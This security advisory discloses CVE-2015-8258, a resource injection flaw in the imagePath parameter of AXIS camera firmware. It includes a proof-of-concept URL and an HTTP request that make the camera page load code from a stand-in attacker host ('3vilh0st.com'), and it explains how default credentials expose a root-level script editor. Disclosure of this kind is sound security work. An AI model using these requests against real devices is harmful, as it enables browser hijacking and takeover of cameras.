@@ -1,0 +1,229 @@
+          0RWELLL4BS
+          **********
+       security advisory
+         olsa-2015-8258
+         PGP: 79A6CCC0
+          @orwelllabs
+
+
+
+
+Advisory Information
+====================
+- Title: ImagePath Resource Injection/Open script editor
+- Vendor: AXIS Communications
+- Research and Advisory: Orwelllabs
+- Class: Improper Input Validation [CWE-20]
+- CVE Name: CVE-2015-8258
+- Affected Versions: Firmwares versions <lt 5.80.x
+- IoT Attack Surface: Device Administrative Interface/Authentication/Autho
+rization
+- OWASP IoTTop10: I1, I2
+
+
+
+Technical Details
+=================
+The variable "imagePath=" (that is prone to XSS in a large range of
+products) also can be used to resource injection intents. If inserted a URL
+in this variable will be made an GET request to this URL, so this an
+interesting point to request malicious codes from the attacker machine, and
+of course, the possibilities are vast (including hook the browser).
+
+
+An attacker sends the following URL for the current Web user interface of
+the camera:
+http://{AXISVULNHOST}/view.shtml?imagepath=http://www.3vilh0
+st.com/evilcode.html
+
+This request will be processed normally and will return the status code 200
+(OK):
+
+[REQUEST]
+
+GET /view.shtml?imagepath=http://www.3vilh0st.com/evilcode.html HTTP/1.1
+Host: {axisvulnhost}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101
+Firefox/41.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Authorization: Digest username="Winst0n", realm="AXIS_XXXXXXXXXXX",
+nonce="00978cY6s4g@Sadd1b11a9A6ed955e1b5ce9eb",
+uri="/view.shtml?imagepath=http://www.3vilh0st.com/evilcode.html",
+response="5xxxxxxxxxxxxxxxxxxxxxx", qop=auth,
+nc=0000002b, cnonce="00rw3ll4bs0rw3lll4bs"
+Connection: keep-alive
+
+
+GET /evilcode.html HTTP/1.1
+Host: www.3vilh0st.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101
+Firefox/41.0
+Accept: image/png,image/*;q=0.8,*/*;q=0.5
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://{axisvulnhost}/view.shtml?imagepath=http://www.3vilh0
+st.com/evilcode.html
+Connection: keep-alive
+
+The server response can be seen below (with the clipping of the affected
+HTML code snippets - just look for "http://www.3vilh0st.com/evilcode.html"):
+
+
+<table border="0" cellpadding="3" cellspacing="3">
+ <tr>
+  <td id="videoStreamTable">
+   <script language="JavaScript">
+    <!--
+     video('http://www.3vilh0st.com/evilcode.html');
+    // -->
+   </script>
+  </td>
+ </tr>
+</table>
+
+[..SNIP..]
+
+function listVideoSources()
+{
+var formInt = document.listFormInt;
+var formExt = document.listFormExt;
+var formCrop = document.listFormCrop;
+var presetForm = document.listFormPreset;
+var form = document.WizardForm
+var currentPath = 'http://www.3vilh0st.com/evilcode.html';
+var imageSource;
+
+[..SNIP..]
+
+var reload = false;
+reload |= (other != null && other.search("seq=yes") >= 0);
+reload |= (other != null && other.search("streamprofile=") >= 0);
+reload |= ((other == null || (other != null && other.search("streamprofile=
+;)(r") == -1)) && ('' != ""));
+reload |= (imagePath != 'http://www.3vilh0st.com/evilcode.html');
+
+[..SNIP..]
+
+<script SRC="/incl/activeX.js?id=69"></script>
+</head>
+<body class="bodyBg" topmargin="0" leftmargin="15" marginwidth="0"
+marginheight="0" onLoad="DrawTB('no', 'http://www.3vilh0st.com/evilcode.html',
+'1', '0', 'no', 'no', 'true', getStreamProfileNbr());" onResize="">
+<script language="JavaScript">
+
+[..SNIP..]
+
+// Draw the scale buttons
+var currentResolution = 0
+var width = 0
+var height = 0
+var imagepath = "http://www.3vilh0st.com/evilcode.html"
+var resStart = imagepath.indexOf("resolution=")
+if (resStart != -1) {
+var resStop = imagepath.indexOf("&", resStart)
+
+[..SNIP..]
+
+
+=================== view.shtml snips =====================
+
+ 447 function zoom(size)
+ 448 {
+ 449   var url = document.URL;
+ 450
+ 451   if (url.indexOf("?") == -1) {
+ 452     url += "F?size=" + size
+ 453   } else if (url.indexOf("size=") == -1) {
+ 454     url += "&size=" + size
+ 455   } else {
+ 456     var searchStr = "size=<!--#echo var="size"
+option="encoding:javascript" -->"
+ 457     var replaceStr = "size=" + size
+ 458     var re = new RegExp(searchStr , "g")
+ 459     url = url.replace(re, replaceStr)
+ 460   }
+ 461
+ 462   document.location = url;
+ 463 }
+ 464
+ 465 var aNewImagePath;
+ 466
+ 467 function reloadPage()
+ 468 {
+ 469   document.location = aNewImagePath;
+ 470 }
+ 471
+
+[ SNIP ]
+
+ 567     aNewImagePath = '/view/view.shtml?id=<!--#echo
+var="ssi_request_id" option="encoding:url" -->&imagePath=' +
+escape(imagePath) + size;
+ 568     if (other != null)
+ 569       aNewImagePath += other;
+ 570 <!--#if expr="$ptzpresets = yes" -->
+ 571     /* append preset parameters so that preset postion is selected in
+drop down list after reload */
+ 572     if (presetName != '')
+ 573       aNewImagePath += "&gotopresetname=" + escape(presetName);
+ 574     else if (gotopresetname != '')
+ 575       aNewImagePath += "&gotopresetname=" + escape(gotopresetname);
+ 576
+ 577     if( newCamera != '')
+ 578       aNewImagePath += "&camera=" + escape(newCamera);
+
+
+
+---*---
+Some legitimate resources can be very interesting to cybercriminals with
+your hansowares/botnets/bitcoinminer/backdoors/malwares etc. In this case
+there are some resources, like the "Open Script Editor". By this resource
+the user can edit any file in the operation system with root privileges,
+because everything (in the most part of IoT devices) runs with root
+privileges, this is other dangerous point to keep in mind.
+
+> Open Script Editor path: 'System Options' -> 'Advanced' -> 'Scripting'
+
+Well, one can say that this feature is restricted to the administrator of
+the camera, and this would be true if customers were forced  to change the
+default password during setup phase with a strong password policy, since
+change "pass" to "pass123" does not solve the problem. The aggravating
+factor is that there are thousands of products available on the internet,
+running with default credentials.
+
+
+Vendor Information, Solutions and Workarounds
++++++++++++++++++++++++++++++++++++++++++++++
+According to the manufacturer, the resource injection vulnerability was
+fixed in firmware 5.60, but we identified that the problem still occurred
+in 5.80.x versions of various product models. Check for updates on the
+manufacturer's website.
+
+About Open Script Editor,It was considered that in order to have access to
+this feature, it is necessary to be authenticated as an admin, but if there
+is no policy that forces the client to change the password during the
+product setup (ease vs. security) and also requires a password complexity,
+having an administrative credential to abuse the functionality is not
+exactly an impediment (e.g: botnets that bring embedded in the code a
+relation of default credentials for that type of device)
+
+
+Credits
+=======
+These vulnerabilities has been discovered and published by Orwelllabs.
+
+
+Legal Notices
+=============
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise. We accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
+
+About Orwelllabs
+================
+https://www.exploit-db.com/author/?a=8225
+https://packetstormsecurity.com/files/author/12322/
